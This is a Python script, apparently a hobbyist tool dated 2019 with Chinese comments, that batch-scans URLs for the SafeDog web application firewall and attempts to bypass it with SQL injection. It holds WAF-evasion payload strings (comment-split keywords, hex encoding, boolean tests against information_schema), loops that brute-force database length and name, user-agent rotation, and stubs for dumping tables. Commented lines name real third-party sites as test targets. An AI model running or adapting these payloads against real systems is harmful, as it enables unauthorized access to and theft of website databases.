#coding:utf-8




'''
使用python3.6开发.
安全狗各版本绕过工具.
正在开发针对4.0的绕过工具.
'''



logo = """

 _____               __        __    _____ 
|  ___|   _ ________ \ \      / /_ _|  ___|
| |_ | | | |_  /_  /  \ \ /\ / / _` | |_   
|  _|| |_| |/ / / /    \ V  V / (_| |  _|  
|_|   \__,_/___/___|    \_/\_/ \__,_|_|   

##########################################

@Author:Remix
@Date:2019-4-25
"""

logo = '\033[1;33m' +'{}'.format(logo)+ '\033[0m'


# import urllib
import random
import re
import requests
import dis
import argparse
import time
import traceback
import logging
import binascii
from lxml import etree
from log import Journal
# from logging.handlers import RotatingFileHandler
# from colorlog import ColoredFormatter















def mian():
    parser = argparse.ArgumentParser(description="Bypassing Security Dog.")
    parser.add_argument('--version','-v',action='store_true',help='Cat version.')
    parser.add_argument('--data','-d',help="Post data.")
    parser.add_argument('--url','-u',help="Scan url.")
    parser.add_argument('--multiple','-m',help="Batch Scanning.")
    parser.add_argument('--Error','-e',action='store_true',help='View error info.')
    args = parser.parse_args()
    return args




# def Judgement_encode():
#     args = mian()
#     return args.encodes




class Find_attribute(object):

    def __init__(self,url):
        self.url = url

    def req(self):
        headers = get_headers()
        r = requests.get(self.url,headers=headers)
        encodes = self.Find_encodes()
        try:
            r = r.content.decode(encodes)
        except Exception as e:
            r = r.text
        # r = r.split('>')
        return r

    
    def req_(self,url):
        headers = get_headers()
        r = requests.get(url,headers=headers)
        encodes = self.Find_encodes()
        try:
            r = r.content.decode(encodes)
        except Exception as e:
            r = r.text
        return r



    def Find_name(self):
        """获取该页面的请求参数值"""
        r = self.req()
        html = etree.HTML(r,etree.HTMLParser())
        result1 = html.xpath('//*/input/@name')
        for result1 in result1:
            yield result1


    def Find_method(self):
        """判断该页面的请求方法，如果存在get则是get方法，如果存在post则是post方法，两个都不存在则是基于ajax的post请求."""
        r = self.req()

        if 'post' in r:
            return 'post'
        elif 'POST' in r:
            return 'POST'
        elif 'get' in r:
            return 'get'
        elif 'GET' in r:
            return 'GET'
        else:
            return random.choice(('POST','post'))


    def Find_encodes(self):
        """查找该页面的编码方式."""
        headers = get_headers()
        r = requests.get(self.url,headers=headers)
        r = r.text
        html = etree.HTML(r,etree.HTMLParser())
        result1 = html.xpath('//*/meta/@content')
        for result1 in result1:
            result1 = result1.split(';')
            for result1 in result1:
                if 'charset' in result1:
                    result1 = result1.split('=')
                    result1 = result1[1].strip()
                    return result1
                            

    
    # def Find_reqajax_parameter(self):
    #     """获取基于ajax的post参数值."""
    #     self.kt_j = []
    #     self.zj_j = []
    #     self.zj_z = []
    #     self.jw_z = []
    #     headers = get_headers()
    #     r = requests.get(self.url,headers=headers)
    #     encodes = self.Find_encodes()
    #     r = r.content.decode(encodes)
    #     html=etree.HTML(r,etree.HTMLParser())
    #     result=html.xpath('//script/text()')
    #     for v in result:
    #         # print(v)
    #         pattern = re.compile(r'data:.*')
    #         result1 = pattern.findall(v)
    #         # print('-> ',result1)
    #         try:
    #             result1 = result1.split(',')
    #         except:
    #             for result1 in result1:
    #                 if result1:
    #                     # print('1 -> ',result1)
    #                     # print('1 -> ',type(result1))
    #                     for result1 in result1.split(':'):
    #                         if result1:
    #                             result1 = result1.split(',')
    #                             for result1 in result1:
    #                                 if result1:
    #                                     # print(result1)
    #                                     #Key matching the beginning.
    #                                     if '{' in result1:
    #                                         if result1:
    #                                             result2 = result1.strip()
    #                                             #Find {
    #                                             f = result2.find('{')
    #                                             f1 = result2[f:].strip()
    #                                             if '{}' not in f1:
    #                                                 f1 = f1.strip('{').strip('"').strip()
    #                                                 self.kt_j.append(f1)
                                                    
                                    
    #                                 #Matching Intermediate key or value.
    #                                 if '{' not in result1 and '"' in result1:
    #                                     if result1:
    #                                         if '"' in result1:
    #                                             result2 = result1.strip().strip('"')
    #                                             self.zj_j.append(result2)

    #                                 if '{' not in result1 and '"' not in result1:
    #                                     if result1:
    #                                         if '}' not in result1:
    #                                             result2 = result1.strip()
    #                                             self.zj_z.append(result2)

    #                                 #Match the endpoint value
    #                                 if '}' in result1 and '"' not in result1:
    #                                     if result1:
    #                                         if '{}' not in result1:
    #                                             f1 = result1.strip('}').strip()
    #                                             self.jw_z.append(f1)
                                            
    #     # print(self.kt_j[0])
    #     # # print(zj_z)
    #     # print(self.zj_j)
    #     # # print(jw_z)
    






class Test(object):
    t = ['\'','<script>','%27']

class Payload1(object):
    #attribute
    b = "hello -> b"

    #空格绕过
    Blank_space1 = ["%20","%09","%0a","%0b","%0c","%0d","%a0","%00"]
    Blank_space2 = "/*{}*/"
    Blank_space3 = " "
    #使用浮点数绕过
    floats = None
    #使用括号绕过
    brackets1 = [""]
    brackets2 = "({})"
    #使用十六进制绕过
    hex_qm1 = "0x{}"
    #逗号绕过
    comma1 = "from"
    comma2 = "offset"


class Payload2(object):
    '''针对4.0版本'''
    a = "hello -> a"
    
    payloads1 = ["Xor True","Xor False","%26%26 true","%26%26 false"]
    payloads2 = "/**//*!order*//**/by/**/{}"

    payloads3 = "%20%26%26%20(length(database/**/())={})"
    payloads4 = "%20%26%26%20(length(hex(database/**/()))={})"
    payloads5 = "%20%26%26%20(left(hex(database/**/()),{})={})"

    payloads6 = "%20%26%26%20(1=(select%20count(/*!{}*/)%20from%20information_Schema.tables%20where%20table_schema=0x{}))"
    payloads7 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20information_schema.taBles%20where%20table_schema=0x{}%20limit%20{}),{}))"
    payloads8 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20information_schema.taBles%20where%20table_schema=0x{}%20limit%20{}),{}))={}"

    payloads9 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20information_schema.Columns%20where%20table_name=0x{}%20limit%20{}){}))"
    payloads10 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20information_schema.Columns%20where%20table_name=0x{}%20limit%20{}){}))={}"

    payloads11 = "%20%26%26%20(1=(select%20count(/*!{}*/)%20from%20{}))"
    payloads12 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20{}%20limit%20{}){}))" 
    payloads13 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20{}%20limit%20{}){}))={}"

    
# s = Payload2()
# p = s.payloads3
# pp = p.format("",4)
# print(pp)


# class Payload3(object):
#     c = "hello -> c"

class RePLace(Payload1,
              Payload2,
              Find_attribute,
              Journal,
              Test):
    '''New payloads.'''

    def __init__(self,url,name):
        # print(self.b)
        # print(self.a)
        self.payloads = []
        self.url = url
        self.name = ''
        self.ekd = ['Error','error','']
        

    def nurl1(self,url,pd=''):
        if '?' in url:
            if 'True' in pd:
                urls = url.split('?')
                url = urls[0]+'?'
                par = urls[1].split('=')
                value = par[1] 
                pars = par[0]+'='
                return (url,pars,value)
            else:
                urls = url.split('?')
                urls = urls[0]
                return urls
        else:
            pass


    def nurl2(self,url,pd=''):
        if '?' in url:
            url1 = []
            par1 = []
            value1 = []
            if 'True' in pd:
                urls = url.split('?')
                url = urls[0]+'?'
                url1.append(url)
                url = urls[1].split('&')
                for pars in url:
                    pars = pars.split('=')
                    pars = pars[0]+'='
                    value = pars[1]
                    par1.append(pars)
                    value1.append(value)
                return (url1,par1,value1)
            else:
                urls = url.split('?')
                url = urls[0]
                url1.append(url)
                return url1
        else:
            pass     
            
        # pattern = re.compile(r'')
        # result1 = pattern.findall(v)
    
    def nurl_(self,url):
        u1 = self.nurl1(url,'True')
        url1 = u1[0]
        pars1 = u1[1]
        value1 = u1[2]
        return (url1,pars1,value1)

    def nurl__(self,url):
        url1 = []
        pars1 = []
        value1 = []        

        u1 = self.nurl2(url,'True')
        
        for url in u1[0]:
            url1.append(url)

        for pars in u1[1]:
            pars1.append(pars)

        for value in u1[2]:
            value1.append(value)

        return (url1,pars1,value1)


    def collect_waf_page(self):
        """
        查找存在安全狗的站点(GET)
        """
        try:
            u1 = self.nurl_(self.url)
            url1 = u1[0]
            pars1 = u1[1]
            payloads = self.t
            for payloads in payloads:
                urls = url1 + pars1 + payloads
                if urls:
                    print('[*]payloads1 -> '+urls)
                r = self.req_(urls)
                if '安全狗' in r or '网站防火墙' in r:
                    return (r,urls)
                    
            return False
        except Exception as e:
            # print('Error1 -> ',traceback.format_exc())
            try:
                u1 = self.nurl__(self.url)
                url = u1[0]
                pars = u1[1]
                # value = u1[2]
                payloads = self.t
                for payloads in payloads:
                    for url1,pars1 in zip(url,pars):
                        urls = url1 + pars1 + payloads
                        if urls:
                            print('[*]payloads2 -> '+urls)
                        r = self.req_(urls)
                        if '安全狗' in r or '网站防火墙' in r:
                            return (r,urls)
                
                return False    
            except Exception as e:
                # print('Error2 -> ',traceback.format_exc())
                return False
                    



    def Injection_point_test(self,url):
        """
        1.注入点测试(GET)
        """
        try:
            u1 = self.nurl_(url)
            url1 = u1[0]
            pars1 = u1[1]
            payloads = self.payloads1
            for payloads in payloads:
                urls = url1 + pars1 + payloads.strip()
                if urls:
                    print('[*]payloads3 -> '+urls)
                r = self.req_(urls)
                if '安全狗' not in r and '网站防火墙' not in r:
                    return (r,urls)
                    
            return False
        except:
            try:
                u1 = self.nurl__(url)
                url = u1[0]
                pars = u1[1]
                payloads = self.payloads1
                for payloads in payloads:
                    for url1,pars1 in zip(url,pars):
                        urls = url1 + pars1 + payloads.strip()
                        if urls:
                            print('[*]payloads4 -> '+urls)
                        r = self.req_(urls)
                        if '安全狗' not in r and '网站防火墙' not in r:
                            return (r,urls)
                
                return False    
            except:
                return False
    
    
    def Judging_database_length1(self,url):
        """
        2.判断数据库长度(GET)
        """
        try:
            u1 = self.nurl_(url)
            url1 = u1[0]
            pars1 = u1[1]
            value1 = u1[2]
            payloads = self.payloads3
            i = 0
            while True:
                urls = url1 + pars1 + '{}'.format(value1).strip() + payloads.format(i)
                if urls:
                    print('[*]payloads5 -> '+urls)
                r = self.req_(urls)
                if '安全狗' not in r and '网站防火墙' not in r:
                    if r:
                        #判断如果长度为0且返回正常页面则payload失效.
                        if i == 0:
                            if r:
                                return False
                        return (r,i)
                i += 1
            return False
        except Exception as e:
            # print('Error1 -> ',traceback.format_exc())
            try:
                u1 = self.nurl__(url)
                url = u1[0]
                pars = u1[1]
                value = u1[2]
                payloads = self.payloads3
                i = 0
                while True:    
                    for url1,pars1,value1 in zip(url,pars,value):
                        urls = url1 + pars1 + '{}'.format(value1).strip() + payloads.format(i)
                        if urls:
                            print('[*]payloads6 -> '+urls)
                        r = self.req_(urls)
                        if '安全狗' not in r and '网站防火墙' not in r:
                            if r:
                                #判断如果长度为0且返回正常页面则payload失效.
                                if i == 0:
                                    if r:
                                        return False
                                return (r,i)
                    i += 1
                return False    
            except Exception as e:
                # print('Error2 -> ',traceback.format_exc())
                return False

    def Judging_database_length2(self,url):
        """
        2.判断数据库长度(GET)
        """
        try:
            u1 = self.nurl_(url)
            url1 = u1[0]
            pars1 = u1[1]
            value1 = u1[2]
            payloads = self.payloads4
            i = 0
            while True:
                urls = url1 + pars1 + '{}'.format(value1).strip() + payloads.format(i)
                if urls:
                    print('[*]payloads7 -> '+urls)
                r = self.req_(urls)
                if '安全狗' not in r and '网站防火墙' not in r:
                    if r:
                        #判断如果长度为0且返回正常页面则payload失效.
                        if i == 0:
                            if r:
                                return False
                        return (r,i)
                i += 1
            return False
        except Exception as e:
            # print('Error1 -> ',traceback.format_exc())
            try:
                u1 = self.nurl__(url)
                url = u1[0]
                pars = u1[1]
                value = u1[2]
                payloads = self.payloads4
                i = 0
                while True:    
                    for url1,pars1,value1 in zip(url,pars,value):
                        urls = url1 + pars1 + '{}'.format(value1).strip() + payloads.format(i)
                        if urls:
                            print('[*]payloads8 -> '+urls)
                        r = self.req_(urls)
                        if '安全狗' not in r and '网站防火墙' not in r:
                            if r:
                                #判断如果长度为0且返回正常页面则payload失效.
                                if i == 0:
                                    if r:
                                        return False
                                return (r,i)
                    i += 1
                return False    
            except Exception as e:
                # print('Error2 -> ',traceback.format_exc())
                return False


    
    def Get_the_database_name(self,url,content):
        """
        3.爆破数据库名(GET)
        """
        try:
            result = []
            u1 = self.nurl_(url)
            url1 = u1[0]
            pars1 = u1[1]
            value1 = u1[2]
            payloads = self.payloads5
            content = binascii.b2a_hex(bytes(content,'utf-8')).decode()
            urls = url1 + pars1 + '{}'.format(value1).strip() + payloads.format(len(content),content).strip()
            print('payloads9 -> '+urls)
            r = self.req_(urls)
            result.append(r)
            i = 0
            for results in result:
                #判断回显
                if self.ekd[0] not in results or self.ekd[1] not in results:
                    content = binascii.a2b_hex(bytes(content,'utf-8')).decode()
                    return (results,content)
            return False
              
        except Exception as e:
            print('Error1 -> ',traceback.format_exc())
            try:
                result = []
                u1 = self.nurl_(url)
                url = u1[0]
                pars = u1[1]
                value = u1[2]
                payloads = self.payloads5
                content = binascii.b2a_hex(bytes(content,'utf-8')).decode()
                for url1,pars1,value1 in zip(url,pars,value):
                    urls = url1 + pars1 + '{}'.format(value1).strip() + payloads.format(len(content),content).strip()
                    print('payloads10 -> '+urls)
                    r = self.req_(urls)
                    result.append(r)
                    for results in result:
                        #判断回显
                        if self.ekd[0] not in results or self.ekd[1] not in results:
                            content = binascii.a2b_hex(bytes(content,'utf-8')).decode()
                            return (results,content)
                return False
            except Exception as e:
                print('Error2 -> ',traceback.format_exc())
                return False

                    




class Blind_injection(RePLace,Find_attribute):
    '''针对4.0盲注'''
    def ZRDCS(self):
        '''注入点测试'''
        # %26 -> &
        pass

    def PDSJKCD(self):
        '''判断数据库长度'''
        pass

    def HQSJKM(self):
        '''获取数据库名'''
        pass

    def PDLBCD(self):
        '''判断列表长度'''
        pass

    def HQLBM(self):
        '''获取列表名'''
        pass

    def PDZDCD(self):
        '''判断字段长度'''
        pass

    def HQZDNR(self):
        '''获取字段内容'''
        pass
    
class Ordinary_injection(RePLace):
    '''普通注入'''
    def Injection_Point(self):
        #判断注入点
        pass

    def ZFDS(self):
        #判断字符段数
        pass

    def KSSZD(self):
        #寻找可显示的字段
        pass

    def CSJKM(self):
        #查数据库名
        pass

    def CBM(self):
        #查表名
        pass

    def CZDM(self):
        #查字段名
        pass

    def CZDSJ(self):
        #查字段数据
        pass


def TK(self):
    '''脱库'''
    pass


def WAF_Inspect():
    pass


# print('\033[1;33m' + '******************************' + '\033[0m')
# print(logo)

                                        





    # def Judgement_encode(self):
    #     """Judgement html doc encode."""
    #     headers = get_headers()
    #     r = requests.get(self.url,headers=headers)
    #     r = r.text
    #     pattern = re.compile(r'<meta.*')
    #     result1 = pattern.findall(r)
    #     for result1 in result1:
    #         result1 = result1.split(' ')
    #         for result1 in result1:
    #             if 'charset' in result1:
    #                 result1 = result1.split('=')
    #                 result1 = result1[1].strip().strip('"')
    #                 return result1
                
    


# def req_():
#     f = Find_method("https://primarymaths.ephhk.com/pages/contain.php")
#     if 'POST' in f or 'post' in f or 'GET' in f or 'get' in f:
#         pass






useragents = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36'
    },
    {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0'
    },
    {
        'User-Agent': 'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0'
    },
    {
        'User-Agent': 'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2'
    }
]


def get_headers():
    """return ramdomly chosen useragent"""

    return random.choice(useragents)


# class test(Find_attribute):

#     def __init__(self,url):
#         self.url = url

#     def test(self):
#         self.Find_reqajax_parameter()
#         # print(self.kt_j)
#         # print(self.zj_j)
#         # print(self.jw_z)
#         # self.Find_name()
#         # print(self.Find_encodes())
        
        
        
        
        











if __name__ == "__main__":
    args = mian()
    if args.version:
        print(logo)
        print('v1.1')
    
    # s = Find_Parameter('https://primarymaths.ephhk.com/pages/contain.php')

    # s2 = s.Find_method("https://primarymaths.ephhk.com/pages/contain.php")
    # print(s1)
    # s2 = s.Find_method("https://www.baidu.com")
    # s2 = random.choice(s2)
    # print(s2)
    # s = test('https://primarymaths.ephhk.com/pages/contain.php')
    # # s = test('https://www.aynax.com/login.php')
    # s.test()

def run():
    args = mian()
    print(logo)
    print('')
    time.sleep(1)
    # with open(args.multiple,'r') as f:
    with open('URL.txt','r') as f:
        for url in f.readlines():
            s = RePLace(url,'Fuzz_WaF')
            a = s.collect_waf_page()
            if not a:
                print('[-]不存在注入点 | url -> '+url)
            else:
                print('[+]存在注入点 | url -> '+url)
                a = s.Injection_point_test(url)
                if not a:
                    print('[-]过滤绕过失败 | url -> '+url)
                else:
                    print('[+]过滤绕过成功 | url -> '+url)
                    a = s.Judging_database_length1(url)
                    if not a:
                        print('[-]获取数据库长度失败 | url1 -> '+url)
                        a = s.Judging_database_length2(url)
                        if not a:
                            print('[-]获取数据库长度失败 | url2 -> '+url)
                        else:
                            print('[+]获取数据库长度成功 | url2 -> '+url)
                            print('[+]当前数据库长度为:{}'.format(a[1]))
                            print('Result2 -> ',a[0])
                    else:
                        print('[+]获取数据库长度成功 | url2 -> '+url)
                        print('[+]当前数据库长度为:{}'.format(a[1]))
                        print('Result1 -> ',a[0])
                        with open('txt/keywords2.txt','r') as r:
                            for line in r.readlines():
                                a = s.Get_the_database_name(url,line.strip())
                                if not a:
                                    print('[-]爆破数据库名称失败 | url -> '+url)
                                else:
                                    print('[+]爆破数据库名称成功 | url -> '+url)
                                    print('[+]数据库名称:{}'.format(a[1]))
                                    print('Result -> ',a[0])
                                    

                    




                
                



run()

# url1 = "https://www.baidu.com/index.php?id=1&ad=1&bd=1"

# url2 = "https://www.baidu.com/index.php?id=1"


# def new_url1(url,pd=''):
#     if '?' in pd:
#         urls = url.split('?')
#         url = urls[0]+'?'
#         par = urls[1].split('=')
#         pars = par[0]+'='
#         return (url,pars)
#     else:
#         urls = url.split('?')
#         urls = urls[0]
#         return urls



# def new_url2(url,pd=''):
#     url1 = []
#     par1 = []
#     if '?' in pd:
#         urls = url.split('?')
#         url = urls[0]+'?'
#         url1.append(url)
#         url = urls[1].split('&')
#         for pars in url:
#             pars = pars.split('=')
#             pars = pars[0]+'='
#             par1.append(pars)
#         return (url1,par1)
#     else:
#         urls = url.split('?')
#         url = urls[0]
#         url1.append(url)
#         return url1








